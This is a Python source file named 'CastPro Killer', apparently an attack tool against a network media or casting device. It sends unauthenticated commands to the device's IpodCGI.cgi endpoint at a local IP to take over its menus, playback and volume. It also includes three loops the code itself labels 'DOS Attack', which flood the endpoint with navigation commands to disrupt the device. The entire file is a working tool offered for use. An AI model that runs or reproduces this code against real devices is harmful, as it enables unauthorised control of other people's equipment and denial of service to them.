import os
import requests

def logo():
    print("""
   ______           __  ____                __ __ _ ____         
  / ____/___ ______/ /_/ __ \_________     / //_/(_) / /__  _____
 / /   / __ `/ ___/ __/ /_/ / ___/ __ \   / ,<  / / / / _ \/ ___/
/ /___/ /_/ (__  ) /_/ ____/ /  / /_/ /  / /| |/ / / /  __/ /    
\____/\__,_/____/\__/_/   /_/   \____/  /_/ |_/_/_/_/\___/_/     
                                                                 
""")

def excution(command):
    try:
        response = requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=" + command)
        print(response, "\n")
    except:
        print("\n[ Command not Excution ]")

def dos1():
    cycle1 = int(input("cycle > "))
    try:
        requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=setup")
        for i in range (1, int(cycle1)):
            for j in range (0, 4):
                requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=right")
            for k in range (0, 4):
                requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=left")
            print(i, "Command Excution")

        requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=return")
    except:
        requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=return")
        print("\n[ End of DOS Attack ]")

def dos2():
    cycle2 = int(input("cycle > "))
    try:
        for j in range (1, cycle2):
            requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=menu")
    except:
        print("\n[ Command not Excution ]")

def dos3():
    cycle3 = int(input("cycle > "))
    try:
        requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=setup")
        for k in range (1, cycle3):
            requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=right")
    except:
        print("\n[ Command not Excution ]")


def helper():
    print("")
    print("\033[96m[ COMMAND ]\n")
    print("\033[96mmenu \033[0m: Go to Menu")
    print("\033[96mguide \033[0m: Go to Guide")
    print("\033[96msetup \033[0m: Go to Setup")
    print("\033[96my \033[0m: Select the Option")
    print("\033[96mr \033[0m: Return to Menu")
    print("\033[96mu \033[0m: UP")
    print("\033[96md \033[0m: DOWN")
    print("\033[96mr \033[0m: Right")
    print("\033[96ml \033[0m: Left")
    print("\033[96mn \033[0m:Next")
    print("\033[96mprev \033[0m: Previous")
    print("\033[96mplay \033[0m: Play")
    print("\033[96mstop \033[0m: Stop")
    print("\033[96mfrwd \033[0m: frwd")
    print("\033[96mffwd \033[0m: ffwd")
    print("\033[96moption_red \033[0m: Option Red")
    print("\033[96moption_green \033[0m: Option Green")
    print("\033[96mdos1 \033[0m: Dos Attack 1")
    print("\033[96mdos2 \033[0m: Dos Attack 2")
    print("\033[96mdos3 \033[0m: Dos Attack 3")
    print("\033[96mvolup \033[0m: Volume Up")
    print("\033[96mvoldown \033[0m: Volume Down")
    print("\033[96mmute \033[0m: Mute Volume")
    print("\033[96mclear \033[0m: Clear Screen")
    print("\033[96mexit \033[0m: Exit the program")
    print("")


if __name__ == "__main__":
    logo()
    
    while True:
        command = input("\033[96mcommand >\033[0m ")

        if (command == "menu"):
            excution(command)
        
        elif (command == "logo"):
            logo()
            
        elif (command == "up"):
            excution(command)

        elif (command == "g"):
            command = "guide"
            excution(command)

        elif (command == "l"):
            command = "left"
            excution(command)
            
        elif (command == "y"):
            command = "select"
            excution(command)

        elif (command == "r"):
            command = "right"
            excution(command)

        elif (command == "return"):
            excution(command)

        elif (command == "down"):
            excution(command)

        elif (command == "setup"):
            excution(command)

        elif (command == "play"):
            excution(command)

        elif (command == "stop"):
            excution(command)

        elif (command == "zoom"):
            excution(command)

        elif (command == "frwd"):
            excution(command)

        elif (command == "ffwd"):
            excution(command)

        elif (command == "prev"):
            excution(command)

        elif (command == "next"):
            excution(command)
            
        elif (command == "option_red"):
            excution(command)
            
        elif (command == "option_green"):
            excution(command)
            
        elif (command == "volup"):
            excution(command)

        elif (command == "voldown"):
            excution(command)

        elif (command == "mute"):
            excution(command)
            
        elif (command == "clear"):
            os.system("clear")

        elif (command == "exit"):
            os.system("clear")
            exit()

        elif (command == "dos1"):
            dos1()
            
        elif (command == "dos2"):
            dos2()

        elif (command == "dos3"):
            dos3()

        elif (command == "help"):
            helper()

        else:
            print("[ Command not Exist ] -> \033[96mhelp\033[0m")